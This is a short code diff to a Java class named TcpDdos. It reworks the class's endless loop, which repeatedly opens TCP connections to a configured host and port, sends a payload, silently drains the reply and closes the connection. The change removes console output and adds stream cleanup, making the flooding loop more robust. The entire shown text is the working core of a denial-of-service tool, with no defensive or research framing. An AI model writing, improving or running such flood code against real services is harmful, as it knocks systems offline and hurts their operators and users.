@@ -29,13 +29,19 @@ public class TcpDdos {
             Socket socket = null;
             while (true) {
                 if (stop) break;
+                InputStream in = null;
+                OutputStream out = null;
                 try {
                     socket = new Socket(socketRequestBuild.getHost(), socketRequestBuild.getPort());
-                    IOUtil.write(socketRequestBuild.getData(), socket.getOutputStream(), false);
-                    StringBuffer stringBuffer = IOUtil.toString(socket.getInputStream(), "UTF-8", false);
-                    System.out.println(stringBuffer.toString());
+                    IOUtil.write(socketRequestBuild.getData(), out = socket.getOutputStream(), false);
+                    in = socket.getInputStream();
+                    byte[] buffer = new byte[2048];
+                    int read = 0;
+                    while ((read = in.read(buffer)) != -1) ;
                 } catch (IOException e) {
                 } finally {
+                    IOUtil.close(out);
+                    IOUtil.close(in);
                     IOUtil.close(socket);
                 }
             }
